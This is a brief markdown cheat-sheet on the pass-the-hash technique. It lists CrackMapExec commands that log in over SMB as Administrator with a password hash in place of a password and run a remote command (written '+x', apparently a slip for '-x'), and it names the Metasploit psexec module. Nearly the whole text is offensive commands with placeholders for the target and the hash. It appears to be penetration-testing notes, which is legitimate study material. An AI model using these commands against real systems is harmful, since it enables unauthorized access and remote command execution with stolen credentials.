# Pass the Hash Technique

**Using Crackmapexec**  
```crackmapexec smb (ip address) -u Administrator -H "(hash in quotes)"```  
Running commands  
```crackmapexec smb (ip address) -u Administrator -H "(hash in quotes)" +x "ipconfig"```

**Using PSexec**  
Metasploit Module: exploit/windows/smb/psexec
